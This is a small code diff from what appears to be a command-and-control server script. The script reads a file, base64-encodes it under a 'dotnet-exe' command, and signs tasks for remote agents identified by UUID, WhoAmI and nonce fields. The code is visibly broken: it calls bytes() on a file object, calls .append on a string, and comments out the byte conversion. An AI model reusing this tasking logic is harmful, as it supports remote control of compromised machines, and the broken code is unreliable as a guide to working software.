@@ -123,7 +123,7 @@ while True:
             with open(path, "rb") as in_file:
                 cm = "dotnet-exe "
                 in_file = base64.b64encode(bytes(in_file, 'utf-8'))
-                cm += in_file
+                cm.append(in_file)
         else: cm = choice
         # I want to preserve the current last check in time
         # so dump the DB and grab that field
@@ -136,7 +136,7 @@ while True:
         whoami = connector["WhoAmI"]
         nonce =  connector["Nonce"]
         result = connector["Result"]
-        byte_inp = bytes(cm, 'utf-8')
+        byte_inp = cm#bytes(cm, 'utf-8')
 
         with open('keys/' + uuid + ".pem", "rb") as key_file:  # Read in the pem file for the UUID
             private_key = serialization.load_pem_private_key(key_file.read(), password=None)
